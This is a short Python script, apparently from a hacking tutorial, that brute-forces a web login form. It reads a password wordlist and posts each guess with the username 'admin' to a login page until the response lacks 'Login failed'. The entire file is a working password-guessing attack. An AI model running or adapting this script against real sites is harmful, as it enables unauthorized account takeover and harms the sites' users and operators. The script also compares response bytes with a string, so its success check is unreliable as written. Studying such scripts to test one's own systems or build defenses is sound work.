#!/usr/bin/env python3

import requests # allows to send requests over http

target_url = "http://abc.com/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"} # input field names as seen in source code

with open("passwordlist.txt", "r") as wordlist_file:
	for line in wordlist_file:
		word = line.strip()
		data_dict["password"] = word
		response = requests.post(target_url, data=data_dict)
		if "Login failed" not in response.content:
			print("[+] password cracked >> " + word)
			exit()

print("[+] password not found :(")
